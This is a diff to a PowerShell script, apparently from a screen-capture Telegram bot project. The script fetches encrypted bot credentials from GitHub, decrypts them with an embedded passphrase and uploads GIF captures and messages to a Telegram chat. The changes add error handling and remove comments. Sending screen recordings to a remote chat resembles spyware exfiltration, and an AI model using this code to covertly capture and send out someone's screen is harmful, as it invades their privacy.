@@ -18,9 +18,9 @@ $CredFile = Join-Path $LocalBase "cred.dat"
 if (-not (Test-Path $CredFile)) {
     Write-Host "cred.dat not found locally. Attempting to download from GitHub..."
     try {
+        # Use the proper raw URL
         $remoteCredUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/main/src/cred.dat"
         Invoke-WebRequest -Uri $remoteCredUrl -OutFile $CredFile -UseBasicParsing
-        # Check that the file is non-empty
         if ((Get-Content $CredFile -Raw).Trim() -eq "") {
             Write-Host "Downloaded cred.dat is empty. Exiting..."
             exit
@@ -56,21 +56,15 @@ function Encrypt-String {
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
     $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
-    # Generate a random salt (16 bytes)
     $salt = New-Object byte[] 16
     [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
-
-    # Derive Key and IV using PBKDF2 (Rfc2898DeriveBytes)
     $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000)
     $aes.Key = $deriveBytes.GetBytes($aes.KeySize / 8)
     $aes.IV  = $deriveBytes.GetBytes($aes.BlockSize / 8)
 
-    # Encrypt plain text
     $encryptor = $aes.CreateEncryptor()
     $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
     $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-
-    # Combine salt + encrypted data and encode to base64
     $result = $salt + $encryptedBytes
     return [Convert]::ToBase64String($result)
 }
@@ -89,14 +83,11 @@ function Decrypt-String {
         Write-Host "Error: Invalid cipher text. Cannot convert from Base64." 
         exit
     }
-    # Ensure we have at least 16 bytes of salt
     if ($allBytes.Length -lt 17) {
         Write-Host "Error: Cipher text is too short."
         exit
     }
-    # Extract the first 16 bytes as salt
     $salt = $allBytes[0..15]
-    # The remaining bytes are the cipher data
     $cipherBytes = $allBytes[16..($allBytes.Length - 1)]
     try {
         $aes = [System.Security.Cryptography.AesManaged]::new()
@@ -104,11 +95,9 @@ function Decrypt-String {
         $aes.BlockSize = 128
         $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
         $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-
         $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000)
         $aes.Key = $deriveBytes.GetBytes($aes.KeySize / 8)
         $aes.IV  = $deriveBytes.GetBytes($aes.BlockSize / 8)
-
         $decryptor = $aes.CreateDecryptor()
         $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
         return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
@@ -143,12 +132,11 @@ function Get-Credentials {
         }
         $Passphrase = Get-Passphrase
         $DecryptedBotToken = Decrypt-String -cipherText $CredObject.BotToken -password $Passphrase
-        $DecryptedChatID   = Decrypt-String -cipherText $CredObject.ChatID   -password $Passphrase
+        $DecryptedChatID   = Decrypt-String -cipherText $CredObject.ChatID -password $Passphrase
         return @{ BotToken = $DecryptedBotToken; ChatID = $DecryptedChatID }
     }
 }
 
-# Retrieve credentials (will use the hard-coded passphrase automatically)
 $Creds = Get-Credentials -CredFile $CredFile
 $BotToken = $Creds.BotToken
 $ChatID   = $Creds.ChatID
@@ -231,15 +219,12 @@ function Send-TelegramAnimation {
     $LF = "`r`n"
     
     $ms = New-Object System.IO.MemoryStream
-    
-    # Field: chat_id
     $chatIdHeader = "--$Boundary$LF" +
                     'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                     $ChatID + $LF
     $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
     $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
     
-    # Field: animation file
     $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
     $fileHeader = "--$Boundary$LF" +
                   'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
@@ -248,7 +233,6 @@ function Send-TelegramAnimation {
     $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
     $ms.Write($fileBytes, 0, $fileBytes.Length)
     
-    # Ending boundary
     $ending = "$LF--$Boundary--$LF"
     $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
     $ms.Write($endingBytes, 0, $endingBytes.Length)
@@ -256,22 +240,27 @@ function Send-TelegramAnimation {
     $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
     $ContentBytes = $ms.ToArray()
     
-    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
-    $WebRequest.Method = "POST"
-    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
-    $WebRequest.ContentLength = $ContentBytes.Length
-    
-    $Stream = $WebRequest.GetRequestStream()
-    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
-    $Stream.Close()
-    
-    $Response = $WebRequest.GetResponse()
-    $ResponseStream = $Response.GetResponseStream()
-    $Reader = New-Object System.IO.StreamReader($ResponseStream)
-    $null = $Reader.ReadToEnd() | Out-Null
-    $Reader.Close()
-    $ResponseStream.Close()
-    $Response.Close()
+    try {
+        $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
+        $WebRequest.Method = "POST"
+        $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
+        $WebRequest.ContentLength = $ContentBytes.Length
+        
+        $Stream = $WebRequest.GetRequestStream()
+        $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
+        $Stream.Close()
+        
+        $Response = $WebRequest.GetResponse()
+        $ResponseStream = $Response.GetResponseStream()
+        $Reader = New-Object System.IO.StreamReader($ResponseStream)
+        $responseText = $Reader.ReadToEnd()
+        Write-Host "Telegram animation response:" $responseText
+        $Reader.Close()
+        $ResponseStream.Close()
+        $Response.Close()
+    } catch {
+        Write-Host "Error sending animation:" $_
+    }
 }
 
 # ------------------------------
@@ -287,10 +276,11 @@ function Send-TelegramMessage {
         text    = $Message
     }
     try {
-        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
+        $result = Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json)
+        Write-Host "Telegram message response:" $result
     }
     catch {
-        Write-Error "Failed to send message: $_"
+        Write-Error "Failed to send message:" $_
     }
 }
 
